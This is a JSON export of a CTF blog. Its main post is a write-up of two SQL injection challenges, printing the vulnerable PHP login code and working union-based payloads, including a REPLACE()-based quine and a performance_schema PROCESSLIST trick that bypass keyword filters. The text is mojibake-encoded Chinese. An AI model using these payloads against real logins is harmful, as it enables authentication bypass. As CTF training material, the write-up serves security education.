{"meta":{"title":"scr1pt_k1ddi3' blog","subtitle":"","description":"","author":"scr1pt_k1ddi3","url":"https://scr1pt-k1ddi3.github.io","root":"/"},"pages":[{"title":"about","date":"2022-04-13T10:12:53.000Z","updated":"2022-04-18T15:55:34.050Z","comments":true,"path":"about.html","permalink":"https://scr1pt-k1ddi3.github.io/about.html","excerpt":"","text":"ğŸ’» å…³äºåšå®¢æœ¬ç«™çº¯å±çèƒ¡é—¹æçš„ï¼Œè¯·å„ä½å®¢å®˜ä¸è¦è½»ä¿¡â¤ï¸ï¼šğŸ˜ƒ å…³äºæˆ‘ğŸ˜ ä¸ªäººç®€ä»‹æœ¬äººæ˜¯ä¸€åªå°å‚»é¸ŸğŸ£ğŸ¥ğŸ¤ï¼Œå¤§èœç‹—ğŸ¶ï¼Œè¿˜è¯·å„ä½å®¢å®˜å¤šå¤šåŒ…å«,å¤šå¤šæŒ‡æ•™ğŸ™ğŸ™ğŸ™ã€‚ğŸ˜·å‚æ‚ŸçœŸè°›ï¼šä½›æ›°ï¼šä¿±ä»¥è±†çš¤æƒ³å‘ä¸è–©ç¼½å¤šç¤™é¡›å¥¢é‚£çš¤æ­»å†¥çˆæ‚‰ç©¶ä¾„ç‰¹çš¤è‹¦å€’è€å’’ä¾„çœŸç›¡è‹¦å‘é å¥¢é®å‰çš¤ç‘Ÿå†¥ç‰¹ä¾å“†æ•¸ç©†å’’åˆ©ä¿±çˆ"},{"title":"æ–‡ç« å½’æ¡£","date":"2022-04-13T14:16:19.393Z","updated":"2022-04-13T13:25:15.839Z","comments":true,"path":"archive.html","permalink":"https://scr1pt-k1ddi3.github.io/archive.html","excerpt":"","text":""},{"title":"friends","date":"2022-04-18T14:51:39.000Z","updated":"2022-04-18T15:50:53.074Z","comments":true,"path":"PY.html","permalink":"https://scr1pt-k1ddi3.github.io/PY.html","excerpt":"","text":"ä½ æˆ‘å¼Ÿå…„ï¼Œè¾ˆå­å¼Ÿå…„ã€‚å…¶ä»–å¼Ÿå…„ï¼Œéƒ½æ˜¯å†’å……ï¼ ğŸ’ªğŸ˜ scr1pt_k1ddi3â€™å¼Ÿå…„â¤ï¸â¤ï¸â¤ï¸"},{"title":"categories","date":"2022-04-13T10:54:10.000Z","updated":"2022-04-13T13:20:09.026Z","comments":true,"path":"categories/index.html","permalink":"https://scr1pt-k1ddi3.github.io/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"yet_another_mysql_injection-and-NISACTF2022-hardsql","slug":"yet_another_mysql_injection-and-NISACTF2022-hardsql","date":"2022-05-18T12:39:37.000Z","updated":"2022-05-18T13:15:18.233Z","comments":true,"path":"2022/05/18/yet_another_mysql_injection-and-NISACTF2022-hardsql/","link":"","permalink":"https://scr1pt-k1ddi3.github.io/2022/05/18/yet_another_mysql_injection-and-NISACTF2022-hardsql/","excerpt":"","text":"yet_another_mysql_injectionï¼š&lt;?php include_once(&quot;lib.php&quot;); function alertMes($mes,$url)&#123; die(&quot;&lt;script&gt;alert(&#39;&#123;$mes&#125;&#39;);location.href=&#39;&#123;$url&#125;&#39;;&lt;/script&gt;&quot;); &#125; function checkSql($s) &#123; if(preg_match(&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\\\\$|0x|sleep|\\ /i&quot;,$s))&#123; alertMes(&#39;hacker&#39;, &#39;index.php&#39;); &#125; &#125; if (isset($_POST[&#39;username&#39;]) &amp;&amp; $_POST[&#39;username&#39;] != &#39;&#39; &amp;&amp; isset($_POST[&#39;password&#39;]) &amp;&amp; $_POST[&#39;password&#39;] != &#39;&#39;) &#123; $username=$_POST[&#39;username&#39;]; $password=$_POST[&#39;password&#39;]; if ($username !== &#39;admin&#39;) &#123; alertMes(&#39;only admin can login&#39;, &#39;index.php&#39;); &#125; checkSql($password); $sql=&quot;SELECT password FROM users WHERE username=&#39;admin&#39; and password=&#39;$password&#39;;&quot;; $user_result=mysqli_query($con,$sql); $row = mysqli_fetch_array($user_result); if (!$row) &#123; alertMes(&quot;something wrong&quot;,&#39;index.php&#39;); &#125; if ($row[&#39;password&#39;] === $password) &#123; die($FLAG); &#125; else &#123; alertMes(&quot;wrong password&quot;,&#39;index.php&#39;); &#125; &#125; if(isset($_GET[&#39;source&#39;]))&#123; show_source(__FILE__); die; &#125; ?&gt; hardsql:&lt;?php //å¤šåŠ äº†äº¿ç‚¹ç‚¹è¿‡æ»¤ include_once(&quot;config.php&quot;); function alertMes($mes,$url)&#123; die(&quot;&lt;script&gt;alert(&#39;&#123;$mes&#125;&#39;);location.href=&#39;&#123;$url&#125;&#39;;&lt;/script&gt;&quot;); &#125; function checkSql($s) &#123; if(preg_match(&quot;/if|regexp|between|in|flag|=|&gt;|&lt;|and|\\||right|left|insert|database|reverse|update|extractvalue|floor|join|substr|&amp;|;|\\\\\\$|char|\\x0a|\\x09|column|sleep|\\ /i&quot;,$s))&#123; alertMes(&#39;waf here&#39;, &#39;index.php&#39;); &#125; &#125; if (isset($_POST[&#39;username&#39;]) &amp;&amp; $_POST[&#39;username&#39;] != &#39;&#39; &amp;&amp; isset($_POST[&#39;passwd&#39;]) &amp;&amp; $_POST[&#39;passwd&#39;] != &#39;&#39;) &#123; $username=$_POST[&#39;username&#39;]; $password=$_POST[&#39;passwd&#39;]; if ($username !== &#39;bilala&#39;) &#123; alertMes(&#39;only bilala can login&#39;, &#39;index.php&#39;); &#125; checkSql($password); $sql=&quot;SELECT passwd FROM users WHERE username=&#39;bilala&#39; and passwd=&#39;$password&#39;;&quot;; $user_result=mysqli_query($MysqlLink,$sql); $row = mysqli_fetch_array($user_result); if (!$row) &#123; alertMes(&#39;nothing found&#39;,&#39;index.php&#39;); &#125; if ($row[&#39;passwd&#39;] === $password) &#123; if($password == &#39;b2f2d15b3ae082ca29697d8dcd420fd7&#39;)&#123; show_source(__FILE__); die; &#125; else&#123; die($FLAG); &#125; &#125; else &#123; alertMes(&quot;wrong password&quot;,&#39;index.php&#39;); &#125; &#125; ?&gt; ä¸¤ç§è§£æ³•ï¼šquineï¼šè¿™ä¸ªquineæ˜¯æˆ‘èŠ±äº†ä¸å°‘æ—¶é—´æ‰çœŸæ­£ææ‡‚çš„ã€‚ è¿™é‡Œå‘ç°äº†ä¸€ä¸ªåˆ†æçš„å¾ˆå¥½çš„æ–‡ç« ï¼šç¬¬äº”ç©ºé—´æ™ºèƒ½å®‰å…¨å¤§èµ›-CTF-Web-yet_another_mysql_injection_m0_53065491çš„åšå®¢-ç¨‹åºå‘˜å®å® - ç¨‹åºå‘˜å®å® (cxybb.com) 1.é¦–å…ˆå…ˆäº†è§£ä¸€ä¸‹replace()å‡½æ•° replace(object,search,replace) æŠŠobjectå¯¹è±¡ä¸­å‡ºç°çš„çš„searchå…¨éƒ¨æ›¿æ¢æˆreplace çœ‹ä¸ªä¾‹å­ select replace(&quot;.&quot;,char(46),&quot;.&quot;);# char(46)å°±æ˜¯. +---------------------------+ | replace(&quot;.&quot;,char(46),&quot;.&quot;) | +---------------------------+ | . | +---------------------------+ 2.å¦‚ä½•è®©è¾“å…¥è¾“å‡ºä¸€è‡´å‘¢ï¼Ÿä¸Šé¢çš„ä¾‹å­ç”¨.æ›¿æ¢objecté‡Œçš„.ï¼Œæœ€ç»ˆè¿”å›äº†ä¸€ä¸ª.ï¼Œé‚£å¦‚æœæˆ‘ä»¬å°†objectå†™æˆreplace(&quot;.&quot;,char(46),&quot;.&quot;)ä¼šæœ‰ä»€ä¹ˆå˜åŒ–å‘¢ï¼Ÿ mysql&gt; select replace(&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;,char(46),&#39;.&#39;); +---------------------------------------------------+ | replace(&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;,char(46),&#39;.&#39;) | +---------------------------------------------------+ | replace(&quot;.&quot;,char(46),&quot;.&quot;) | +---------------------------------------------------+ ç»“æœè¿”å›äº†replace(&quot;.&quot;,char(46),&quot;.&quot;)è¿™ä¸ªä¸œè¥¿ï¼Œä½†è¿˜æ˜¯æ²¡æœ‰è¾¾åˆ°æˆ‘ä»¬é¢„æœŸçš„æ•ˆæœæ€ä¹ˆåŠï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°†ç¬¬ä¸‰ä¸ªå‚æ•°ä¹Ÿæ”¹æˆreplace(&quot;.&quot;,char(46),&quot;.&quot;) mysql&gt; select replace(&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;,char(46),&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;); +---------------------------------------------------------------------------+ | replace(&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;,char(46),&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;) | +---------------------------------------------------------------------------+ | replace(&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;,char(46),&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;) | +---------------------------------------------------------------------------+ æœ‰ç‚¹ç±»ä¼¼å¥—å¨ƒçš„æ„Ÿè§‰ã€‚å…ˆåˆ†æä¸€ä¸‹è¿™æ®µsqlè¯­å¥ select replace(&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;,char(46),&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;); replaceå‡½æ•°çš„ä¸‰ä¸ªå‚æ•°åˆ†åˆ«æ˜¯ &#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39; char(46) &#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39; è¿™ä¸ªè¯­å¥çš„æ„æ€æ˜¯ç”¨ç¬¬ä¸‰ä¸ªå‚æ•°æ›¿æ¢ç¬¬ä¸€ä¸ªå‚æ•°é‡Œé¢çš„.å¹¶è¿”å›æ›¿æ¢åçš„ç¬¬ä¸€ä¸ªå‚æ•° è¿™æ ·å°±æ˜ç™½äº†ä¸ºä»€ä¹ˆè¿”å›çš„æ˜¯replace(&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;,char(46),&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;) é‚£ä¹ˆè¿™æ ·æ˜¯å¦å°±è¾¾åˆ°äº†æˆ‘ä»¬è¾“å…¥è¾“å‡ºä¸€è‡´çš„ç›®çš„å‘¢ï¼Œç­”æ¡ˆè‚¯å®šæ˜¯è¿˜æ²¡æœ‰ã€‚ç»†å¿ƒç‚¹å°±ä¼šå‘ç°è¾“å…¥ä¸è¾“å‡ºåœ¨å•åŒå¼•å·ä¸Šæœ‰ç»†å¾®çš„ä¸åŒ 3.è§£å†³å•åŒå¼•å·ä¸åŒçš„é—®é¢˜æœ‰äº†ä¸Šé¢çš„ç»éªŒåï¼Œæˆ‘ä»¬è¿™æ ·è€ƒè™‘ï¼Œå¦‚æœå…ˆå°†åŒå¼•å·æ›¿æ¢æˆå•å¼•å·æ˜¯ä¸æ˜¯å°±å¯ä»¥è§£å†³å¼•å·ä¸åŒçš„é—®é¢˜äº†ã€‚å®ç°æ–¹æ³•æ— éå°±æ˜¯åœ¨å¥—ä¸€å±‚replace mysql&gt; select replace(replace(&#39;&quot;.&quot;&#39;,char(34),char(39)),char(46),&quot;.&quot;);# å…ˆæ‰§è¡Œå†…å±‚replace +--------------------------------------------------------+ | replace(replace(&#39;&quot;.&quot;&#39;,char(34),char(39)),char(46),&quot;.&quot;) | +--------------------------------------------------------+ | &#39;.&#39; | +--------------------------------------------------------+ 1 row in set (0.00 sec) è¿™æ ·å°±å¯ä»¥å°†æˆ‘ä»¬çš„åŒå¼•å·æ›¿æ¢æˆå•å¼•å·ï¼Œæ­¤æ—¶æˆ‘ä»¬ç»§ç»­æ²¿ç”¨ä¸Šé¢çš„æ€è·¯ï¼Œæ„é€ è¾“å…¥è¾“å‡ºç›¸åŒçš„è¯­å¥ mysql&gt; select replace(replace(&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;,char(34),char(39)),char(46),&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;); +------------------------------------------------------------------------------------------------------------------------------------------------------------+ | replace(replace(&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;,char(34),char(39)),char(46),&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;) | +------------------------------------------------------------------------------------------------------------------------------------------------------------+ | replace(replace(&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;,char(34),char(39)),char(46),&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;) | +------------------------------------------------------------------------------------------------------------------------------------------------------------+ 1 row in set (0.00 sec) å¼€å§‹åˆ†æï¼š replace(&quot;.&quot;,char(46),&quot;.&quot;);è¿™ä¸ªæ²¡ä»€ä¹ˆå¥½è¯´çš„ mysql&gt; select replace(&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;,char(46),&#39;.&#39;); +---------------------------------------------------+ | replace(&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;,char(46),&#39;.&#39;) | +---------------------------------------------------+ | replace(&quot;.&quot;,char(46),&quot;.&quot;) | +---------------------------------------------------+ 1 row in set (0.00 sec) è¿™ä¸€å¥å°±ä¹‹æ‰€ä»¥ä¼šè¿”å›è¿™ä¸ªç»“æœæ˜¯å› ä¸º**&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;æ˜¯ä¸€ä¸ªè¦è¢«æ›¿æ¢çš„å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥å®ƒæ˜¯ä¸ä¼šè¢«æ‰§è¡Œçš„ï¼ï¼ï¼**è¿™ä¸ªçœ‹ä¼¼å¾ˆæ„šè ¢çš„é—®é¢˜åœ¨äºåé¢å½“å­—ç¬¦ä¸²å¤šèµ·æ¥æ—¶å°±ä¸å®¹æ˜“å‘ç°äº†ï¼ï¼ï¼ mysql&gt; select replace(&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;,char(46),&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;); +---------------------------------------------------------------------------+ | replace(&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;,char(46),&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;) | +---------------------------------------------------------------------------+ | replace(&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;,char(46),&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;) | +---------------------------------------------------------------------------+ 1 row in set (0.00 sec) replace(&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;,char(46),&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;); replace(&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;,char(46),&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;) è¿™é‡Œè¿”å›çš„ç»“æœçœ‹èµ·æ¥å¾ˆåƒä½†æ˜¯æ˜¯ä¸ä¸€æ ·çš„ï¼ŒæŸ¥è¯¢æ˜¯åŒå¼•å·ï¼Œè¿”å›æ˜¯å•å¼•å·ã€‚æ‰€ä»¥æ€è·¯å°±æ˜¯replaceå°†åŒå¼•å·æ›¿æ¢ä¸ºå•å¼•å·ã€‚ mysql&gt; select replace(replace(&#39;&quot;.&quot;&#39;,char(34),char(39)),char(46),&quot;.&quot;); +--------------------------------------------------------+ | replace(replace(&#39;&quot;.&quot;&#39;,char(34),char(39)),char(46),&quot;.&quot;) | +--------------------------------------------------------+ | &#39;.&#39; | +--------------------------------------------------------+ 1 row in set (0.00 sec) è¿™é‡Œé¢æ˜¯å°†â€.â€æ¢ä¸ºâ€™.â€™ï¼Œç„¶ååˆå°†â€™.â€™ä¸­çš„.æ¢äº†ä¸€æ¬¡ä¸€æ ·çš„. å…¶å®è¿™æ—¶è¿”å›äº†å•å¼•å·å°±æ˜¯å·²ç»å°†åŒå¼•å·æ¢æˆäº†å•å¼•å·ï¼Œè€Œåé¢çš„ç¬¬äºŒæ¬¡æ›¿æ¢åœ¨è¿™é‡Œçœ‹ä¼¼æ²¡ä»€ä¹ˆï¼Œä½†æ˜¯å…¶å®åé¢æ˜¯ç”¨æ¥æ„é€ è¯­å¥çš„ç›¸ç­‰çš„ã€‚ mysql&gt; select replace(replace(&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;,char(34),char(39)),char(46),&quot;.&quot;); +------------------------------------------------------------------------------+ | replace(replace(&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;,char(34),char(39)),char(46),&quot;.&quot;) | +------------------------------------------------------------------------------+ | replace(&#39;.&#39;,char(46),&#39;.&#39;) | +------------------------------------------------------------------------------+ 1 row in set (0.00 sec) å¯¹åº”è¿™ä¸Šé¢ mysql&gt; select replace(&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;,char(46),&#39;.&#39;); +---------------------------------------------------+ | replace(&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;,char(46),&#39;.&#39;) | +---------------------------------------------------+ | replace(&quot;.&quot;,char(46),&quot;.&quot;) | +---------------------------------------------------+ 1 row in set (0.00 sec) è¿™æ—¶å¯ä»¥çœ‹åˆ°è¿”å›çš„ç»“æœå°±æ˜¯å•å¼•å·ï¼Œæ‰€ä»¥æŒ‰ç…§ä¸Šé¢çš„æ€è·¯ï¼Œåªè¦åŠ ä¸ŠåŒå¼•å·å‘å•å¼•å·çš„æ›¿æ¢å°±æ˜¯quineäº†ã€‚ mysql&gt; select replace(replace(&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;,char(34),char(39)),char(46),&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;); +------------------------------------------------------------------------------------------------------------------------------------------------------------+ | replace(replace(&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;,char(34),char(39)),char(46),&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;) | +------------------------------------------------------------------------------------------------------------------------------------------------------------+ | replace(replace(&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;,char(34),char(39)),char(46),&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;) | +------------------------------------------------------------------------------------------------------------------------------------------------------------+ 1 row in set (0.00 sec) ç»è¿‡ä¸¤æ¬¡æ›¿æ¢æˆåŠŸquineã€‚ä¸€æ¬¡åŒå¼•å·å‘å•å¼•å·çš„æ›¿æ¢ï¼Œä¸€æ¬¡æ˜¯æ„é€ ç›¸ç­‰çš„æ›¿æ¢ï¼Œä½†æ˜¯ä¼ é€’çš„å‚æ•°ä¸­ç¬¬ä¸€ä¸ªå’Œç¬¬ä¸‰ä¸ªå‚æ•°éƒ½æœ‰replaceã€‚ replace(replace(&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;,char(34),char(39)),char(46),&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;); åˆ†æï¼šç¬¬ä¸€æ¬¡ï¼šreplace(â€˜replace(replace(â€œ.â€,char(34),char(39)),char(46),â€.â€)â€™,char(34),char(39)) è¿”å›replace(replace(&#39;.&#39;,char(34),char(39)),char(46),&#39;.&#39;)ç„¶åå†æ¬¡æ‰§è¡Œå¤–å±‚replaceï¼Œæ˜¯åœ¨ç°åœ¨è¿™æ¡ä¸Šæ¢çš„ï¼Œ .æ¢æˆåé¢çš„å‚æ•°ï¼Œ replace(replace(&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;,char(34),char(39)),char(46),&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;) æˆåŠŸquineã€‚ QuineåŸºæœ¬å½¢å¼ï¼šreplace(replace(&#39;str&#39;,char(34),char(39)),char(46),&#39;str&#39;) å…ˆå°†stré‡Œçš„åŒå¼•å·æ›¿æ¢æˆå•å¼•å·ï¼Œå†ç”¨stræ›¿æ¢stré‡Œçš„**.** stråŸºæœ¬å½¢å¼ï¼ˆå¯ä»¥ç†è§£æˆä¸Šé¢çš„**&quot;.&quot;**ï¼‰ replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;) å®Œæ•´çš„Quineå°±æ˜¯QuineåŸºæœ¬å½¢å¼+stråŸºæœ¬å½¢å¼ ç„¶åæ„é€ payload,å…¶å®å°±æ˜¯æ¢strï¼Œstrè¦é—­åˆå‰é¢çš„sqlè¯­å¥ï¼Œ &#39;/**/union/**/select(REPLACE(REPLACE(&#39;&quot;/**/union/**/select(REPLACE(REPLACE(&quot;!&quot;,CHAR(34),CHAR(39)),CHAR(33),&quot;!&quot;))#&#39;,CHAR(34),CHAR(39)),CHAR(33),&#39;&quot;/**/union/**/select(REPLACE(REPLACE(&quot;!&quot;,CHAR(34),CHAR(39)),CHAR(33),&quot;!&quot;))#&#39;))# åŸç†åŒä¸Šã€‚ æ³¨æ„ç»•è¿‡ï¼šç»•è¿‡æ—¶å¯ä»¥ä½¿ç”¨char()å‡½æ•°ï¼Œä½†æ˜¯hardsqlä¸­charå‡½æ•°è¢«ç¦ï¼Œå¯ä»¥ç”¨åå…­è¿›åˆ¶ç»•è¿‡ï¼Œå¦‚ï¼š &#39;union/**/SELECT/**/REPLACE(REPLACE(&#39;&quot;union/**/SELECT/**/REPLACE(REPLACE(&quot;!&quot;,0x22,0x27),0x21,&quot;!&quot;)/**/AS/**/E#&#39;,0x22,0x27),0x21,&#39;&quot;union/**/SELECT/**/REPLACE(REPLACE(&quot;!&quot;,0x22,0x27),0x21,&quot;!&quot;)/**/AS/**/E#&#39;)/**/AS/**/E# &#39;/**/union/**/select(REPLACE(REPLACE(&#39;&quot;/**/union/**/select(REPLACE(REPLACE(&quot;!&quot;,0x22,0x27),0x21,&quot;!&quot;))#&#39;,0x22,0x27),0x21,&#39;&quot;/**/union/**/select(REPLACE(REPLACE(&quot;!&quot;,0x22,0x27),0x21,&quot;!&quot;))#&#39;))# PROCESSLISTï¼šè¿™æ˜¯NU1Læˆ˜é˜Ÿçš„payloadï¼Œåˆ©ç”¨çš„æ˜¯processlistè¡¨ï¼Œ performance_schema.threadsè¡¨ä¸­çš„PROCESSLIST_INFOä¼šè®°å½•çº¿ç¨‹æ­£åœ¨æ‰§è¡Œçš„å®Œæ•´è¯­å¥ å…ˆè´´payloadç„¶åæ…¢æ…¢åˆ†æï¼š SELECT password FROM users WHERE username=&#39;admin&#39; and password=&#39;1&#39;union/**/select/**/mid(`11`,65,217)/**/from(select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17/**/union/**/select/**/*/**/from/**/performance_schema.threads/**/where/**/name/**/like&#39;%connection%&#39;/**/limit/**/1,1)t# è¿™é‡Œé¢é¦–å…ˆæ˜¯performance_schema.threadsè¡¨çš„ä»‹ç»ï¼Œperformance_schema.threadsè¡¨ä¸­çš„PROCESSLIST_INFOä¼šè®°å½•çº¿ç¨‹æ­£åœ¨æ‰§è¡Œçš„å®Œæ•´è¯­å¥: å¯ä»¥çœ‹åˆ°è¿™é‡Œé¢ä¼šè®°å½•ç€æŸ¥è¯¢çš„è¯­å¥ï¼Œæ˜¯PROCESSLIST_INFOå­—æ®µï¼Œç„¶åå°±æ˜¯å¦‚ä½•å»ä»ä¸­å®šä½åˆ°æœ€åçš„è¿™ä¸ªè¯­å¥ï¼Œwhere/**/name/**/like&#39;%connection%&#39;/å°±æ˜¯é€šè¿‡æ­£åˆ™è¡¨è¾¾å¼çš„æ–¹å¼å»æ‰¾åˆ°çš„ å¯ä»¥çœ‹åˆ°è¿™æ ·å°±æ˜¯æ‰¾åˆ°äº†è¯­å¥ï¼Œç„¶åå°±æ˜¯è·å–PROCESSLIST_INFOå­—æ®µï¼Œæœ¬æ¥æ˜¯ç›´æ¥selectå°±è¡Œï¼Œä½†æ˜¯ç”±äºè¿™é‡Œinè¢«è¿‡æ»¤ï¼Œæ‰€ä»¥ç›´æ¥æŸ¥è¡¨åæ˜¯ä¸è¡Œäº†ï¼Œæ‰€ä»¥ç”¨çš„æ˜¯æ— åˆ—åæ³¨å…¥ï¼Œ select/**/mid(`11`,65,217)/**/from(select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17/**/union/**/select/**/*/**/from/**/performance_schema.threads/**/where/**/name/**/like&#39;%connection%&#39;/**/limit/**/1,1)t# è¿™é‡Œé¢select `11`æ˜¯å› ä¸ºPROCESSLIST_INFOæ˜¯ç¬¬åä¸€ä¸ªå­—æ®µï¼Œ mid(`11`,65,217)åˆ™æ˜¯æˆªå–æŸ¥è¯¢è¯­å¥ç”¨çš„ï¼ŒSELECT password FROM users WHERE username=&#39;admin&#39; and password=&#39;ä¸€å…±æ˜¯64ï¼Œåé¢æˆªå–åˆ°217ï¼Œæ‰€ä»¥æŸ¥å‡ºæ¥çš„å¯ä»¥ç­‰äºpasswordè¾“å…¥çš„ã€‚ mysql&gt; select mid(&quot;SELECT password FROM users WHERE username=&#39;admin&#39; and password=&#39;1&#39;union/**/select/**/mid(`11`,65,217)/**/from(select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17/**/union/**/select/**/*/**/from/**/performance_schema.threads/**/where/**/name/**/like&#39;%connection%&#39;/**/limit/**/1,1)t#&quot;,65,217); +------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ | mid(&quot;SELECT password FROM users WHERE username=&#39;admin&#39; and password=&#39;1&#39;union/**/select/**/mid(`11`,65,217)/**/from(select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17/**/union/**/select/**/*/**/from/**/performance_schema.threads/**/where/**/name/**/like&#39;%c | +------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ | 1&#39;union/**/select/**/mid(`11`,65,217)/**/from(select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17/**/union/**/select/**/*/**/from/**/performance_schema.threads/**/where/**/name/**/like&#39;%connection%&#39;/**/limit/**/1,1)t# | +------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ 1 row in set (0.00 sec) ä½†æ˜¯PROCESSLISTä½¿ç”¨æ˜¯æœ‰æ¡ä»¶çš„ï¼Œ mysql&gt; select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17/**/union/**/select/**/*/**/from/**/performance_schema.threads/**/where/**/name/**/like&#39;%connection%&#39;; +----+---------------------------+------------+------+------+-----------+------+-------+------+--------------+-------------------------------------------------------------------------------------------------------------------------------+------+------+-----+-----+--------+-------+ | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9 | 10 | 11 | 12 | 13 | 14 | 15 | 16 | 17 | +----+---------------------------+------------+------+------+-----------+------+-------+------+--------------+-------------------------------------------------------------------------------------------------------------------------------+------+------+-----+-----+--------+-------+ | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9 | 10 | 11 | 12 | 13 | 14 | 15 | 16 | 17 | | 31 | thread/sql/one_connection | FOREGROUND | 5 | root | localhost | zzc | Query | 0 | Sending data | select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 union select * from performance_schema.threads where name like&#39;%connection%&#39; | NULL | NULL | YES | YES | TCP/IP | 30380 | +----+---------------------------+------------+------+------+-----------+------+-------+------+--------------+-------------------------------------------------------------------------------------------------------------------------------+------+------+-----+-----+--------+-------+ å¯ä»¥çœ‹å‡ºï¼Œå½“å¼€å¯ä½¿ç”¨æ—¶limit 1,1æ‰èƒ½æŸ¥å‡ºä¸‹é¢ä¸€è¡Œçš„æ•°æ®ï¼Œå…³é—­æ—¶åªæœ‰ä¸Šé¢çš„æ•°å­—ã€‚hardsqlä¸­å°±å…³é—­äº†processlistè¡¨ã€‚æ‰€ä»¥åªèƒ½ç”¨quineã€‚ å¹¶ä¸”mysqlå’Œmariadbçš„processliståˆ—æ•°æ˜¯ä¸ä¸€æ ·çš„ï¼Œä¸€ä¸ª14ï¼Œä¸€ä¸ª17. ç¬¬ä¸‰å±Šç¬¬äº”ç©ºé—´ç½‘ç»œå®‰å…¨å¤§èµ›-é€‰æ‹”èµ›-éƒ¨åˆ†Writeup_æœ«åˆ Â· mochu7-ç¨‹åºå‘˜å®å® - ç¨‹åºå‘˜å®å® (cxybb.com)","categories":[{"name":"CTF","slug":"CTF","permalink":"https://scr1pt-k1ddi3.github.io/categories/CTF/"},{"name":"write up","slug":"CTF/write-up","permalink":"https://scr1pt-k1ddi3.github.io/categories/CTF/write-up/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://scr1pt-k1ddi3.github.io/tags/CTF/"},{"name":"web","slug":"web","permalink":"https://scr1pt-k1ddi3.github.io/tags/web/"}]},{"title":"pwnhub-TemplatePlay","slug":"pwnhub-TemplatePlay","date":"2022-05-17T16:08:39.000Z","updated":"2022-05-17T16:24:29.931Z","comments":true,"path":"2022/05/18/pwnhub-TemplatePlay/","link":"","permalink":"https://scr1pt-k1ddi3.github.io/2022/05/18/pwnhub-TemplatePlay/","excerpt":"","text":"è§£é¢˜è¿‡ç¨‹è¿›å»å‘ç°æ³¨å…¥ç‚¹ï¼š ç»è¿‡é•¿ä¹…çš„å°è¯•ï¼Œå‘ç°è¿‡æ»¤ä¼¼ä¹æ˜¯è¿‡æ»¤äº†[]. &quot;&quot;. &#39;&#39;. (). 